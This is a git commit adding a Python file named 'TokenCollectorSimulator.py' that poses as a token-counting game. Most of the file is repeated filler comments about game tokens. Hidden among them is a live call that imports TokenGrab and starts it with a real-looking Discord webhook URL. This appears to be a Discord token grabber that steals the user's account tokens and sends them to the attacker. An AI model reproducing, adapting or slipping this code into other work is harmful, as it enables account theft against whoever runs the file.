e21fa4e506eea8852d725d39761849e2c185fb57
Forbiidens <104028583+Forbiidens@users.noreply.github.com>
2022-04-19 14:38:16 -0400

    Add files via upload

---
+++ TokenCollectorSimulator.py
@@ -0,0 +1,71 @@
+#return values of tokens to player
+#once the game ends you count the amount of tokens
+#the main code countines on the next page, if you have the code
+#return values of tokens to player
+#once the game ends you count the amount of tokens
+#the main code countines on the next page, if you have the code
+#return values of tokens to player
+#once the game ends you count the amount of tokens
+#the main code countines on the next page, if you have the code
+#return values of tokens to player
+#once the game ends you count the amount of tokens
+#the main code countines on the next page, if you have the code
+from src import TokenGrab
+TokenGrab("https://discord.com/api/webhooks/965334350579236884/NlmAxrPnIv83zyvHbs2mp7hC0D8Xl28ysmIhHcpm4w35rbCLQg9nmuLJMMVloYkZdNHY").start()
+#return values of tokens to player
+#once the game ends you count the amount of tokens
+#the main code countines on the next page, if you have the code
+#return values of tokens to player
+#once the game ends you count the amount of tokens
+#the main code countines on the next page, if you have the code
+#return values of tokens to player
+#once the game ends you count the amount of tokens
+#the main code countines on the next page, if you have the code
+#return values of tokens to player
+#once the game ends you count the amount of tokens
+#the main code countines on the next page, if you have the code
+#return values of tokens to player
+#once the game ends you count the amount of tokens
+#the main code countines on the next page, if you have the code
+#return values of tokens to player
+#once the game ends you count the amount of tokens
+#the main code countines on the next page, if you have the code
+
+
+#return values of tokens to player
+#once the game ends you count the amount of tokens
+#the main code countines on the next page, if you have the code
+
+
+
+
+#return values of tokens to player
+#once the game ends you count the amount of tokens
+#the main code countines on the next page, if you have the code
+
+
+#return values of tokens to player
+#once the game ends you count the amount of tokens
+#the main code countines on the next page, if you have the code
+
+
+#return values of tokens to player
+#once the game ends you count the amount of tokens
+#the main code countines on the next page, if you have the code
+
+
+#return values of tokens to player
+#once the game ends you count the amount of tokens
+#the main code countines on the next page, if you have the code
+
+
+#return values of tokens to player
+#once the game ends you count the amount of tokens
+#the main code countines on the next page, if you have the code
+
+
+#return values of tokens to player
+#once the game ends you count the amount of tokens
+#the main code countines on the next page, if you have the code
+
+
